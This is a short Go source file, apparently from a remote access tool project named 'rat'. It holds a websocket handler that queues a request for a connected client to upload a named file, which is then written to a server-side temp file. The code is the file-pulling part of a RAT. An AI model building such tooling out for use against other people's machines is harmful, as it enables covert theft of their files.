package main

import (
	"fmt"
	"io/ioutil"
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type DownloadMessage struct {
	File string
}

func (d DownloadMessage) Handle(ws *websocket.Conn, client *Client) error {
	file, err := ioutil.TempFile("", "download")
	if err != nil {
		return err
	}

	fmt.Println("requesting", d)

	client.Listeners[header.DownloadToServerHeader] = ws
	Transfers[d.File] = &Transfer{file, d.File, 0, 0}
	client.Queue <- &DownloadPacket{File: d.File}

	return nil
}
